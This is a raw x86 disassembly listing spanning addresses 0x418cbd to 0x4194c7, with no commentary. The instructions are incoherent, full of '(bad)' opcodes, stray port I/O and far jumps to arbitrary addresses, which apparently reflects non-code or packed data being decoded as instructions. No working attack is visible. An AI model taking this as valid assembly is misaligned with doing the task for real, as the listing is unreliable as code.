  418cbd:	push   ds
  418cbe:	inc    ecx
  418cbf:	loope  0x418c6e
  418cc1:	in     al,dx
  418cc2:	ins    BYTE PTR es:[edi],dx
  418cc3:	aaa    
  418cc4:	add    al,0xec
  418cc6:	(bad)  
  418cc7:	xlat   BYTE PTR ds:[ebx]
  418cc8:	mov    eax,ds:0x5b1e5286
  418ccd:	int3   
  418cce:	push   esp
  418ccf:	dec    edx
  418cd0:	test   eax,0xe3b3e4a2
  418cd5:	call   0x61d0e6bd
  418cda:	push   ss
  418cdb:	xchg   edi,eax
  418cdc:	jecxz  0x418ce7
  418cde:	test   BYTE PTR [edi+0x31b39f46],bh
  418ce4:	nop
  418ce5:	push   ss
  418ce6:	fs dec esi
  418ce8:	adc    ah,BYTE PTR ds:0x23b6a9c2
  418cee:	fs jne 0x418d01
  418cf1:	push   es
  418cf2:	addr16 leave 
  418cf4:	and    esi,DWORD PTR [edx-0x26]
  418cf7:	aaa    
  418cf8:	push   0x76
  418cfa:	mov    esp,0x12234cb3
  418cff:	jae    0x418d61
  418d01:	mov    esp,esi
  418d03:	jmp    0x418d40
  418d05:	ret    
  418d06:	or     edx,DWORD PTR [ebp+0x753d679f]
  418d0c:	jmp    0x418ce9
  418d0e:	dec    esp
  418d0f:	xchg   edx,eax
  418d10:	inc    eax
  418d11:	pusha  
  418d12:	popa   
  418d13:	(bad)  
  418d14:	out    dx,al
  418d15:	fsubr  st,st(1)
  418d17:	sub    ecx,eax
  418d19:	das    
  418d1a:	retf   0x16ea
  418d1d:	jbe    0x418cad
  418d1f:	mov    bh,0xe3
  418d21:	cmc    
  418d22:	dec    ecx
  418d23:	mov    dl,BYTE PTR ds:0xada4b982
  418d29:	jge    0x418cf5
  418d2b:	xchg   ebx,eax
  418d2c:	mov    esp,0xe8d3ae38
  418d31:	fstp   DWORD PTR [eax+0x10d1eb5c]
  418d37:	fs and ebp,ebp
  418d3a:	adc    ebx,DWORD PTR [ebp-0x2ece3ee2]
  418d40:	pop    ss
  418d41:	ffree  st(5)
  418d43:	adc    BYTE PTR [edx+ebx*2],al
  418d46:	push   ebx
  418d47:	clc    
  418d48:	data16 js 0x418da4
  418d4b:	push   ds
  418d4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d4d:	inc    edx
  418d4e:	lahf   
  418d4f:	int3   
  418d50:	xchg   edi,eax
  418d51:	fstp   DWORD PTR [ebx+0x1]
  418d54:	or     BYTE PTR [edi+ecx*4],ch
  418d57:	add    eax,DWORD PTR [esi-0x3075fd01]
  418d5d:	ss cmp ecx,eax
  418d60:	(bad)  
  418d61:	addr16 mov ecx,0x47055512
  418d67:	outs   dx,BYTE PTR ds:[esi]
  418d68:	add    al,0x9d
  418d6a:	popf   
  418d6b:	adc    al,BYTE PTR [eax]
  418d6d:	push   ds
  418d6e:	sbb    DWORD PTR [esi],esp
  418d70:	aam    0x78
  418d72:	lahf   
  418d73:	fadd   QWORD PTR [edx+0x48]
  418d76:	(bad)  
  418d78:	mov    ds:0xb9988d5,al
  418d7d:	mov    edi,0x2aa1e9ef
  418d82:	mov    ecx,DWORD PTR [ebx-0x169ee1d4]
  418d88:	inc    esi
  418d89:	pop    ss
  418d8a:	jp     0x418dc8
  418d8c:	push   eax
  418d8d:	jle    0x418dbc
  418d8f:	in     eax,dx
  418d90:	push   ebx
  418d91:	cdq    
  418d92:	jo     0x418d90
  418d94:	out    0x2b,al
  418d96:	sahf   
  418d97:	cmp    cl,ch
  418d99:	imul   eax,DWORD PTR [ecx+0x7eaad6b3],0xffffffdc
  418da0:	shr    ebp,1
  418da2:	adc    al,0xfe
  418da4:	not    DWORD PTR [ebp-0x6f]
  418da7:	mov    ah,0xf5
  418da9:	adc    ah,BYTE PTR [ecx]
  418dab:	jle    0x418dd6
  418dad:	cld    
  418dae:	imul   esp,DWORD PTR [edx+0x2e615b56],0x90df6c
  418db8:	xor    esi,DWORD PTR [eax]
  418dba:	fist   DWORD PTR [esi-0x36dba27a]
  418dc0:	retf   
  418dc1:	xchg   ecx,eax
  418dc2:	mov    edi,0x2db8507d
  418dc7:	add    al,0x61
  418dc9:	popa   
  418dca:	inc    esp
  418dcb:	mov    al,ds:0xfb51af1
  418dd0:	cs xchg esi,eax
  418dd2:	ror    DWORD PTR [eax+edi*4],1
  418dd5:	imul   ebp,DWORD PTR [edx+0x8],0x15
  418dd9:	in     eax,dx
  418dda:	icebp  
  418ddb:	loop   0x418d9a
  418ddd:	inc    edi
  418dde:	sbb    al,0x99
  418de0:	call   0x5b41:0x83a5e94c
  418de7:	sbb    eax,0xa4cfa1c2
  418dec:	mov    al,ds:0xb0f17992
  418df1:	aaa    
  418df2:	pushf  
  418df3:	(bad)  
  418df4:	adc    cl,dh
  418df6:	dec    ebp
  418df7:	ins    BYTE PTR es:[edi],dx
  418df8:	test   eax,0xd87399e
  418dfd:	ss out dx,eax
  418dff:	es jg  0x418d90
  418e02:	push   ds
  418e03:	imul   esi,DWORD PTR [edi+esi*8+0x6a],0x55
  418e08:	sub    DWORD PTR [eax-0x1b],0x45721f5
  418e0f:	push   ebx
  418e10:	pop    edi
  418e11:	dec    ecx
  418e12:	loop   0x418e1c
  418e14:	and    DWORD PTR [ebp-0x2122c14],esp
  418e1a:	inc    esp
  418e1b:	inc    edi
  418e1c:	daa    
  418e1d:	xchg   edx,eax
  418e1e:	adc    DWORD PTR [esi+0x58],ebp
  418e21:	cmc    
  418e22:	cmp    eax,0x8bf15143
  418e27:	jge    0x418e60
  418e29:	in     al,dx
  418e2a:	xor    edx,DWORD PTR [ecx]
  418e2c:	sbb    dh,bl
  418e2e:	js     0x418de1
  418e30:	mov    ah,BYTE PTR [ecx-0x514e271f]
  418e36:	data16 sub al,0x0
  418e39:	and    eax,0xf3d2503d
  418e3e:	test   eax,edx
  418e40:	arpl   bx,sp
  418e42:	jp     0x418e77
  418e44:	cdq    
  418e45:	and    ebx,esp
  418e47:	js     0x418dd8
  418e49:	stos   BYTE PTR es:[edi],al
  418e4a:	cmp    esi,DWORD PTR [eax-0x2d74f52b]
  418e50:	jge    0x418e96
  418e52:	out    0xf6,al
  418e54:	mov    al,ds:0xb0a6ced5
  418e59:	int    0x35
  418e5b:	sbb    DWORD PTR [edi+0x27],ecx
  418e5e:	nop
  418e5f:	outs   dx,DWORD PTR ds:[esi]
  418e60:	or     eax,0x1620b515
  418e65:	outs   dx,DWORD PTR ds:[esi]
  418e66:	cs enter 0x643,0xc4
  418e6b:	or     al,0xbf
  418e6d:	mov    ds:0xed54e784,al
  418e72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e73:	jns    0x418ee9
  418e75:	lea    edx,[ecx]
  418e77:	pusha  
  418e78:	sbb    bh,dh
  418e7a:	mov    ch,0xaa
  418e7c:	mov    edx,ebp
  418e7e:	adc    esi,ebp
  418e80:	dec    esi
  418e81:	aad    0xf5
  418e83:	lea    ebp,[ecx-0x59]
  418e86:	imul   ebx,esp,0xfffffffa
  418e89:	sbb    bl,BYTE PTR [ebp-0xc21ccd1]
  418e8f:	push   ds
  418e90:	mov    esp,gs
  418e92:	shl    BYTE PTR [eax+0x45],0x8
  418e96:	outs   dx,DWORD PTR ds:[esi]
  418e97:	stos   DWORD PTR es:[edi],eax
  418e98:	jge    0x418ecf
  418e9a:	mov    ds:0x97a5b107,al
  418e9f:	shr    ah,1
  418ea1:	mov    dh,0x20
  418ea3:	adc    esp,DWORD PTR [eax-0x6c]
  418ea6:	add    DWORD PTR ss:[ebx+0x18],0x2bf303c6
  418eae:	pushf  
  418eaf:	mov    cl,0x49
  418eb1:	stos   DWORD PTR es:[edi],eax
  418eb2:	cmp    ch,bh
  418eb4:	sub    BYTE PTR [ebx+0x769e3362],0xa2
  418ebb:	fstp   TBYTE PTR [edx]
  418ebd:	mov    ecx,0xce1f4b45
  418ec2:	test   al,0x68
  418ec4:	loopne 0x418ea4
  418ec6:	jbe    0x418f3a
  418ec8:	daa    
  418ec9:	(bad)  
  418eca:	rcr    DWORD PTR [ecx],1
  418ecc:	imul   ebp,DWORD PTR [esi],0xdfe99809
  418ed2:	in     eax,dx
  418ed3:	xchg   edx,eax
  418ed4:	rcl    BYTE PTR [edi-0x38],cl
  418ed7:	rcr    DWORD PTR [ecx],cl
  418ed9:	sub    ah,BYTE PTR [ecx-0x18af379c]
  418edf:	iret   
  418ee0:	lods   al,BYTE PTR ds:[esi]
  418ee1:	(bad)  
  418ee2:	out    dx,al
  418ee3:	push   cs
  418ee4:	mov    ah,0xfb
  418ee6:	push   ds
  418ee7:	cmp    esi,esi
  418ee9:	pushf  
  418eea:	or     BYTE PTR [esi-0x80],cl
  418eed:	loope  0x418f0f
  418eef:	jmp    0x418ee1
  418ef1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ef2:	cdq    
  418ef3:	ret    0xf603
  418ef6:	push   esi
  418ef7:	cmp    bh,ch
  418ef9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418efa:	std    
  418efb:	sub    al,BYTE PTR [edx+0x55]
  418efe:	clc    
  418eff:	fcmovnu st,st(6)
  418f01:	mov    al,ds:0xc6ce73b2
  418f06:	mov    ch,0xc4
  418f08:	sbb    al,0x7c
  418f0a:	int3   
  418f0b:	mov    al,0x15
  418f0d:	jnp    0x418f58
  418f0f:	pop    esi
  418f10:	das    
  418f11:	adc    BYTE PTR [ecx+0x15fad440],0xa1
  418f18:	(bad)  
  418f19:	inc    DWORD PTR [eax+0x68]
  418f1c:	mov    bl,0x8f
  418f1e:	stos   BYTE PTR es:[edi],al
  418f1f:	leave  
  418f20:	dec    esp
  418f21:	out    dx,al
  418f22:	out    0x32,al
  418f24:	pmaddwd mm0,mm0
  418f27:	mov    al,ds:0xcd160c8a
  418f2c:	or     al,BYTE PTR [ebx-0x38c69915]
  418f32:	sub    DWORD PTR [ecx+0x1b],ebx
  418f35:	aam    0xf6
  418f37:	mov    ebp,0xf68729be
  418f3c:	sbb    eax,0x763c7816
  418f41:	pop    edi
  418f42:	fst    DWORD PTR [ebx]
  418f44:	scas   al,BYTE PTR es:[edi]
  418f45:	imul   ebx,DWORD PTR [eax+0x552fe105],0xa398b48f
  418f4f:	jb     0x418f72
  418f51:	leave  
  418f52:	sub    al,0x3
  418f54:	fnsave [esi-0x40a6367]
  418f5a:	mov    al,0x93
  418f5c:	xor    DWORD PTR [eax+0x1733caf3],esp
  418f62:	popa   
  418f63:	imul   ecx,DWORD PTR [ecx-0x1556e8d0],0xd2faa4bf
  418f6d:	adc    esp,DWORD PTR [edi]
  418f6f:	add    ebx,esi
  418f71:	sub    DWORD PTR [edx+0x16aaa97a],ebx
  418f77:	dec    ebx
  418f78:	sbb    dh,BYTE PTR [esp+ecx*1]
  418f7b:	inc    ecx
  418f7c:	inc    ebx
  418f7d:	mov    al,ds:0x4b302e90
  418f82:	pop    esi
  418f83:	sbb    DWORD PTR ds:0x96d97912,ecx
  418f89:	mov    dh,0xd2
  418f8b:	jo     0x418fbc
  418f8d:	or     eax,0x9fd3348
  418f92:	call   0x2b9a:0x6a4be694
  418f99:	jns    0x418f74
  418f9b:	jns    0x418fd9
  418f9d:	xchg   edx,eax
  418f9e:	cmp    DWORD PTR [edx+0x45b4cc81],esi
  418fa4:	fild   DWORD PTR [esi-0x17]
  418fa7:	imul   DWORD PTR [esi+0x57c6ee5c]
  418fad:	dec    ebx
  418fae:	push   0xa3881782
  418fb3:	call   0xb874:0x9fab5039
  418fba:	mov    ebp,0xb1c29ea9
  418fbf:	push   eax
  418fc0:	les    esi,FWORD PTR [eax+0x43]
  418fc3:	int    0x64
  418fc5:	int3   
  418fc6:	loope  0x41903d
  418fc8:	lods   al,BYTE PTR ds:[esi]
  418fc9:	mov    ebx,edi
  418fcb:	fdivrp st(1),st
  418fcd:	jb     0x419022
  418fcf:	(bad)  
  418fd0:	mov    cl,0x1b
  418fd2:	pop    eax
  418fd3:	xor    DWORD PTR [eax-0x6c],esi
  418fd6:	test   al,0x55
  418fd8:	mov    cl,0x81
  418fda:	aas    
  418fdb:	xchg   esi,eax
  418fdc:	lods   eax,DWORD PTR ds:[esi]
  418fdd:	sub    al,0x84
  418fdf:	stos   DWORD PTR es:[edi],eax
  418fe0:	push   ebp
  418fe1:	xor    BYTE PTR [esp+edi*8+0x13],al
  418fe5:	dec    eax
  418fe6:	into   
  418fe7:	lds    esi,FWORD PTR [edx+0x2b]
  418fea:	adc    ah,BYTE PTR [edx-0x45]
  418fed:	jbe    0x41906c
  418fef:	adc    DWORD PTR [ebp+0x1e],edi
  418ff2:	mov    bl,0x30
  418ff4:	pop    es
  418ff5:	pop    ecx
  418ff6:	mov    ah,0x62
  418ff8:	mov    ds:0xaa8bb16e,eax
  418ffd:	push   cs
  418ffe:	hlt    
  418fff:	fld    QWORD PTR [ebx+0xe17ad2c]
  419005:	mov    al,BYTE PTR [ebx+0x5556e816]
  41900b:	lods   al,BYTE PTR ds:[esi]
  41900c:	(bad)  
  41900d:	pusha  
  41900e:	popf   
  41900f:	into   
  419010:	dec    edx
  419011:	add    DWORD PTR [eax-0x20903983],eax
  419017:	or     eax,0xffaaa3af
  41901c:	fild   QWORD PTR [ebx]
  41901e:	add    ebx,DWORD PTR [ebx-0x2ecbebe3]
  419024:	inc    ebx
  419025:	dec    ebp
  419026:	jmp    0xc16d:0xdfc48c09
  41902d:	jle    0x418fcf
  41902f:	mov    WORD PTR [edi+0x15],fs
  419032:	out    dx,eax
  419033:	gs cmp al,0x57
  419036:	sbb    al,0x18
  419038:	(bad)  
  419039:	fdivr  QWORD PTR ds:0xc68e62eb
  41903f:	sbb    eax,0x94196b6f
  419044:	ds lock pushf 
  419047:	fisttp DWORD PTR [ecx+0xb]
  41904a:	push   0xa4af2755
  41904f:	inc    eax
  419050:	xchg   ecx,eax
  419051:	sbb    DWORD PTR ds:0x589aa798,0x815f603
  41905b:	xchg   BYTE PTR [esi+ebp*4],ch
  41905e:	and    al,0x57
  419060:	jnp    0x419032
  419062:	push   0x2d
  419064:	dec    esi
  419065:	jp     0x418fe7
  419067:	ffree  st(1)
  419069:	hlt    
  41906a:	lods   al,BYTE PTR ds:[esi]
  41906b:	sbb    BYTE PTR [ecx],ch
  41906d:	jl     0x419046
  41906f:	xor    al,bl
  419071:	jno    0x41902c
  419073:	cwde   
  419074:	xor    dl,BYTE PTR [eax-0x2dc4eacb]
  41907a:	(bad)  
  41907b:	fwait
  41907c:	cmp    al,0x23
  41907e:	lds    ecx,FWORD PTR es:[ebx-0x44dda049]
  419085:	sbb    eax,0x2f19366b
  41908a:	(bad)  
  41908b:	xchg   ebx,eax
  41908c:	bound  esp,QWORD PTR [edx+ecx*4-0x6a]
  419090:	pop    edi
  419091:	shl    esi,cl
  419093:	das    
  419094:	pop    es
  419095:	sub    ecx,esp
  419097:	in     eax,dx
  419098:	mov    al,ds:0x88318978
  41909d:	aam    0x55
  41909f:	push   cs
  4190a0:	test   al,0xfc
  4190a2:	push   ecx
  4190a3:	ins    BYTE PTR es:[edi],dx
  4190a4:	call   0xbc6a:0x75ecb5a2
  4190ab:	inc    ecx
  4190ac:	xchg   esi,eax
  4190ad:	shl    DWORD PTR [edi],0xb1
  4190b0:	aad    0x25
  4190b2:	pop    eax
  4190b3:	out    dx,al
  4190b4:	push   ebx
  4190b5:	cmc    
  4190b6:	leave  
  4190b7:	repz aad 0x31
  4190ba:	xor    al,0xde
  4190bc:	dec    edi
  4190bd:	cmp    BYTE PTR [ebx],bh
  4190bf:	mov    cl,BYTE PTR [eax]
  4190c1:	mov    edx,0xc8865fca
  4190c6:	sahf   
  4190c7:	jae    0x41912a
  4190c9:	cli    
  4190ca:	mov    ch,BYTE PTR [ecx]
  4190cc:	out    0xa,al
  4190ce:	push   ecx
  4190cf:	push   ecx
  4190d0:	sbb    bl,BYTE PTR [ebx+0x19]
  4190d3:	aaa    
  4190d4:	cmp    edi,DWORD PTR [edx-0x33]
  4190d7:	call   0x53d28083
  4190dc:	add    ecx,ebx
  4190de:	popf   
  4190df:	call   0x648e6252
  4190e4:	bound  esp,QWORD PTR [ecx-0x4b76c901]
  4190ea:	cmp    al,0xee
  4190ec:	push   cx
  4190ee:	mov    al,ds:0x7c28f1ca
  4190f3:	sub    bh,BYTE PTR [edx]
  4190f5:	mov    WORD PTR [edx-0x12acf201],cs
  4190fb:	and    ch,dl
  4190fd:	ret    
  4190fe:	mov    BYTE PTR [edx-0x1fbe36fb],ch
  419104:	xlat   BYTE PTR ds:[ebx]
  419105:	pop    ds
  419106:	and    DWORD PTR [eax+0x33db84fd],0x4acd118f
  419110:	push   ss
  419111:	or     eax,0xe580e095
  419116:	dec    eax
  419117:	add    bh,dh
  419119:	jge    0x4190cd
  41911b:	stos   DWORD PTR es:[edi],eax
  41911c:	jno    0x41914a
  41911e:	call   0x207b9829
  419123:	inc    ebx
  419124:	les    esp,FWORD PTR [ecx]
  419126:	sbb    al,0x60
  419128:	or     eax,0x495ad489
  41912d:	aad    0x51
  41912f:	inc    edi
  419131:	adc    eax,0x8eca8a10
  419136:	sub    BYTE PTR [edi+0x13b1c841],dl
  41913c:	mov    eax,0xf434a283
  419141:	fwait
  419142:	outs   dx,BYTE PTR ds:[esi]
  419143:	or     BYTE PTR [edx],0xed
  419146:	(bad)  
  419147:	ins    BYTE PTR es:[edi],dx
  419148:	iret   
  419149:	les    esi,FWORD PTR [esi-0x1f]
  41914c:	or     ebx,eax
  41914e:	or     BYTE PTR [ecx+edx*4+0x41c062dd],bh
  419155:	cmp    ecx,edx
  419157:	cmp    ebx,DWORD PTR [ebx]
  419159:	lds    ebp,FWORD PTR [edx+0x21ac3218]
  41915f:	jmp    0x61d5:0xc1d6797a
  419166:	push   cs
  419167:	xchg   ebx,eax
  419168:	push   cs
  419169:	aas    
  41916a:	push   eax
  41916b:	adc    eax,0xf78e7919
  419170:	mov    dl,0xf2
  419172:	inc    ebp
  419173:	fld    st(6)
  419175:	out    dx,eax
  419176:	cmp    ah,BYTE PTR [ebp+0x26]
  419179:	or     esi,eax
  41917b:	ret    
  41917c:	mov    eax,ds:0xb46b42f2
  419181:	ins    DWORD PTR es:[edi],dx
  419182:	pushf  
  419183:	loop   0x419121
  419185:	ret    
  419186:	into   
  419187:	retf   
  419188:	add    DWORD PTR [esi],eax
  41918a:	fmul   st,st(0)
  41918c:	sar    BYTE PTR [ecx-0x40f36906],0x6d
  419193:	mov    dl,0x6b
  419195:	test   DWORD PTR [eax+ebx*8],0xce770f39
  41919c:	inc    edx
  41919d:	repnz repz fnstsw WORD PTR ss:[ebx]
  4191a2:	add    BYTE PTR [ebx],0x40
  4191a5:	out    dx,al
  4191a6:	mov    al,BYTE PTR [eax+0x3247c053]
  4191ac:	jb     0x4191fd
  4191ae:	sbb    DWORD PTR [ebp+0x2dc4aa64],ebx
  4191b4:	ret    0x1d29
  4191b7:	push   esp
  4191b8:	adc    ah,BYTE PTR [edi+esi*2]
  4191bb:	mov    dh,BYTE PTR [esi-0x7c225dc3]
  4191c1:	ins    DWORD PTR es:[edi],dx
  4191c2:	mov    ds:0xbf72e9c2,eax
  4191c7:	mov    esp,0x7e6269f9
  4191cc:	jb     0x419248
  4191ce:	imul   ebp,DWORD PTR [eax-0x6e1945bb],0xffffffda
  4191d5:	and    eax,0xdfa8c01c
  4191da:	push   cs
  4191db:	or     DWORD PTR [ebx-0x5b658c3],ebp
  4191e1:	mov    bl,0xb6
  4191e3:	cmp    dh,dl
  4191e5:	aam    0x7f
  4191e7:	jne    0x4191c3
  4191e9:	aaa    
  4191ea:	pop    edx
  4191eb:	add    BYTE PTR [esi],bl
  4191ed:	mov    esi,0x921af779
  4191f2:	test   al,0xb9
  4191f4:	and    esi,esp
  4191f6:	mov    si,0x7db9
  4191fa:	pushf  
  4191fb:	imul   eax,DWORD PTR [edx-0x214bd032],0xa0c11ddd
  419205:	test   DWORD PTR [ecx+0xb],0xb148b119
  41920c:	dec    esi
  41920d:	(bad)  
  41920e:	out    0x22,eax
  419210:	lock loop 0x419256
  419213:	test   ah,cl
  419215:	imul   ebx,ebx,0xce1407f5
  41921b:	jnp    0x419244
  41921d:	shr    BYTE PTR [eax],1
  41921f:	xchg   ebp,eax
  419220:	fist   DWORD PTR [ebp+0x4686781c]
  419226:	popa   
  419227:	shl    DWORD PTR [edi+0x5d5ea3ae],1
  41922d:	and    esi,eax
  41922f:	pop    edi
  419230:	mov    eax,0x8e714542
  419235:	jle    0x419255
  419237:	and    bh,BYTE PTR [esi]
  419239:	imul   ebx,ebx,0xffffffef
  41923c:	mov    es,WORD PTR gs:0x197330c7
  419243:	ss jp  0x4192a4
  419246:	mov    fs,WORD PTR [edi]
  419248:	aad    0x3d
  41924a:	push   ebp
  41924b:	push   ebx
  41924c:	rcl    BYTE PTR [ebx+0x4cec4927],cl
  419252:	adc    eax,0xec40c4f
  419257:	fxch   st(4)
  419259:	fs jnp 0x41923e
  41925c:	and    al,0x3f
  41925e:	aaa    
  41925f:	dec    ecx
  419260:	pop    edx
  419261:	pop    es
  419262:	leave  
  419263:	ja     0x4192a4
  419265:	add    al,0xdb
  419267:	xchg   ebx,eax
  419268:	test   al,0x33
  41926a:	cli    
  41926b:	pop    ds
  41926c:	out    dx,al
  41926d:	aad    0x72
  41926f:	iret   
  419270:	and    cl,BYTE PTR [ecx]
  419272:	adc    eax,0xbd39b813
  419277:	mov    ds:0x4a40af78,al
  41927c:	push   0xf9f09db8
  419281:	rcr    DWORD PTR [edx-0x153ffdb2],1
  419287:	hlt    
  419288:	or     al,0xef
  41928a:	fidiv  DWORD PTR [eax+eiz*2]
  41928d:	push   esp
  41928e:	jge    0x4192b1
  419290:	nop
  419291:	daa    
  419292:	and    BYTE PTR [eax-0xe3ed683],bh
  419298:	push   es
  419299:	daa    
  41929a:	mov    edx,0x33f37158
  41929f:	or     esi,0x5e4e52f5
  4192a5:	cmc    
  4192a6:	sub    ebx,eax
  4192a8:	push   cs
  4192a9:	and    ecx,esp
  4192ab:	shl    cl,0x63
  4192ae:	pop    es
  4192af:	out    0xc,al
  4192b1:	rcl    DWORD PTR [ecx+0x6a],1
  4192b4:	and    eax,0x49679932
  4192b9:	mov    ebx,0xe080699b
  4192be:	xchg   cl,dh
  4192c0:	mov    edi,0xb4c99a2e
  4192c5:	not    ebx
  4192c7:	fwait
  4192c8:	hlt    
  4192c9:	in     eax,dx
  4192ca:	outs   dx,BYTE PTR ds:[esi]
  4192cb:	dec    edx
  4192cc:	jmp    0xf136:0x19277d3
  4192d3:	mov    ch,0xd3
  4192d5:	and    eax,0xb6547423
  4192da:	push   cs
  4192db:	inc    edi
  4192dc:	jle    0x419267
  4192de:	call   0xca7e:0x44cc5ba5
  4192e5:	sbb    al,0x92
  4192e7:	js     0x41932b
  4192e9:	mov    al,0x81
  4192eb:	dec    edx
  4192ec:	mov    edx,DWORD PTR [ecx]
  4192ee:	fucomi st,st(0)
  4192f0:	pop    edi
  4192f1:	das    
  4192f2:	shr    BYTE PTR [esi-0x541e38c9],0xd
  4192f9:	xor    DWORD PTR [esi-0x2a],eax
  4192fc:	cld    
  4192fd:	int    0x5e
  4192ff:	xchg   DWORD PTR [ebx+eiz*2],edi
  419302:	mov    eax,ds:0xaadde9ac
  419307:	xor    DWORD PTR [ebp-0x46],eax
  41930a:	clc    
  41930b:	xor    DWORD PTR [eax+0x70],esi
  41930e:	call   0x746efc4c
  419313:	out    dx,al
  419314:	sbb    dh,BYTE PTR [edx]
  419316:	std    
  419317:	cmp    eax,0xeb424cf5
  41931c:	cmc    
  41931d:	adc    eax,0xbfe60318
  419322:	fst    DWORD PTR [esi]
  419324:	and    DWORD PTR [eax+0x73c3f0f2],esi
  41932a:	lea    esi,[eax+0x262c14e3]
  419330:	loope  0x4192fc
  419332:	fucomip st,st(2)
  419334:	lea    ebp,[eax]
  419336:	mov    al,0xf6
  419338:	mov    eax,ds:0x638dc513
  41933d:	aas    
  41933e:	std    
  41933f:	out    0xa6,al
  419341:	sub    BYTE PTR [edx+edx*1-0x33],al
  419345:	call   0x4021af43
  41934a:	dec    eax
  41934b:	clc    
  41934c:	(bad)  
  41934d:	scas   eax,DWORD PTR es:[edi]
  41934e:	mov    ah,0xa8
  419350:	or     DWORD PTR [eax],esp
  419352:	mov    WORD PTR [edx],?
  419354:	sbb    ebp,DWORD PTR [esi-0x6e204897]
  41935a:	(bad)
  41935d:	or     ecx,0xffffffd5
  419360:	fild   WORD PTR [esi-0x53]
  419363:	mov    al,ds:0x71ee796f
  419368:	dec    ecx
  419369:	scas   eax,DWORD PTR es:[edi]
  41936a:	inc    BYTE PTR [ecx-0x21d90eb7]
  419370:	xor    dl,dh
  419372:	sbb    BYTE PTR [esp+edx*1-0x5e],bl
  419376:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419377:	sub    cl,BYTE PTR [edx+0x5744a7b3]
  41937d:	outs   dx,BYTE PTR ds:[esi]
  41937e:	adc    esp,eax
  419380:	(bad)  
  419381:	retf   
  419382:	adc    ch,bh
  419384:	loop   0x41938d
  419386:	fisubr DWORD PTR [edx+0xb5a96e5]
  41938c:	fcom   DWORD PTR [ebp-0x13c0df2c]
  419392:	mov    eax,0x6b2b9446
  419397:	loope  0x41940e
  419399:	adc    eax,0x7e96eb57
  41939e:	mov    dh,0x11
  4193a0:	jns    0x4193c4
  4193a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4193a3:	jge    0x4193d9
  4193a5:	stc    
  4193a6:	mov    ds:0x6e4c223f,al
  4193ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4193ac:	cmc    
  4193ad:	std    
  4193ae:	out    dx,eax
  4193af:	ss xchg ecx,eax
  4193b1:	pop    edx
  4193b2:	push   ecx
  4193b3:	ss pop ecx
  4193b5:	clc    
  4193b6:	call   0x78ad:0xbcce79ef
  4193bd:	fstp   QWORD PTR [ecx-0x1f771338]
  4193c3:	mov    ds:0x442f0582,eax
  4193c8:	jle    0x41941e
  4193ca:	inc    ebp
  4193cb:	mov    esi,0x192a5cba
  4193d0:	mov    bh,0x1a
  4193d2:	jmp    0x419434
  4193d4:	imul   ecx,DWORD PTR [edi+0x5],0x676691e
  4193db:	ret    0x5973
  4193de:	(bad)  
  4193e1:	dec    edx
  4193e2:	cli    
  4193e3:	pop    ss
  4193e4:	bswap  ebx
  4193e6:	sti    
  4193e7:	jp     0x419403
  4193e9:	pop    eax
  4193ea:	pushf  
  4193eb:	inc    eax
  4193ec:	clc    
  4193ed:	and    eax,0x37e4932c
  4193f2:	loop   0x4193aa
  4193f4:	adc    dl,BYTE PTR [ecx-0x6f859ce2]
  4193fa:	dec    edx
  4193fb:	mov    bl,BYTE PTR [edx-0x2d]
  4193fe:	je     0x419431
  419400:	add    ecx,DWORD PTR [edx]
  419402:	shr    BYTE PTR ds:0xa0600400,0x90
  419409:	pop    ecx
  41940a:	retf   0x810
  41940d:	das    
  41940e:	pusha  
  41940f:	xor    ebx,DWORD PTR [ebx]
  419411:	push   edx
  419412:	(bad)  
  419414:	push   ds
  419415:	inc    edi
  419416:	(bad)  
  419418:	jno    0x419499
  41941a:	loope  0x41947c
  41941c:	fld    QWORD PTR [esi+0x75baad7c]
  419422:	jp     0x4193c5
  419424:	sbb    eax,0x6f40d8d5
  419429:	inc    ebx
  41942a:	cwde   
  41942b:	aam    0x80
  41942d:	inc    edx
  41942e:	or     DWORD PTR [edx-0x51],0x338f3818
  419435:	arpl   WORD PTR [eax+0x679d857b],dx
  41943b:	push   0xffffff84
  41943d:	mov    ah,0x66
  41943f:	xor    DWORD PTR [edi],edi
  419441:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419442:	or     esp,DWORD PTR [ecx]
  419444:	mov    bh,BYTE PTR [edi]
  419446:	jmp    0x4193d6
  419448:	sub    BYTE PTR [ecx+0x73b30a69],cl
  41944e:	clc    
  41944f:	pop    es
  419450:	retf   0x808
  419453:	mov    dh,BYTE PTR [ebx+0x75afa20a]
  419459:	aam    0xac
  41945b:	fmulp  st(4),st
  41945d:	scas   al,BYTE PTR es:[edi]
  41945e:	dec    ebx
  41945f:	jae    0x419492
  419461:	or     al,0x20
  419463:	je     0x41941e
  419465:	in     al,dx
  419466:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419467:	imul   ebx,DWORD PTR [eax-0x2d],0xf162e660
  41946e:	idiv   BYTE PTR [edi]
  419470:	xchg   BYTE PTR [eax-0x50b9e42f],bh
  419476:	inc    esp
  419477:	add    DWORD PTR [edi-0xa7c5601],ebx
  41947d:	xor    ah,BYTE PTR [eax]
  41947f:	mov    cs:0xa9472821,al
  419485:	sub    DWORD PTR [ebp-0x5988370b],edx
  41948b:	stos   DWORD PTR es:[edi],eax
  41948c:	xor    ebp,DWORD PTR [ecx]
  41948e:	push   esi
  41948f:	push   edx
  419490:	fst    DWORD PTR [esi-0x30]
  419493:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419494:	cwde   
  419495:	mov    ecx,0x8849544c
  41949a:	or     ebp,DWORD PTR ds:0x614f68ed
  4194a0:	aam    0xc8
  4194a2:	repz or ebp,DWORD PTR [ecx-0x6f]
  4194a6:	or     DWORD PTR [esi+edx*4-0xdb2e204],esi
  4194ad:	aaa    
  4194ae:	dec    ebx
  4194af:	mov    ebx,edx
  4194b1:	repz retf 0x90a1
  4194b5:	inc    ecx
  4194b6:	daa    
  4194b7:	les    ecx,FWORD PTR [ebp+0x4d]
  4194ba:	and    al,0xdb
  4194bd:	xor    DWORD PTR [esi],ebp
  4194bf:	(bad)  
  4194c0:	jmp    0xc766:0x61f2bd11
  4194c7:	call   0x927a18f8
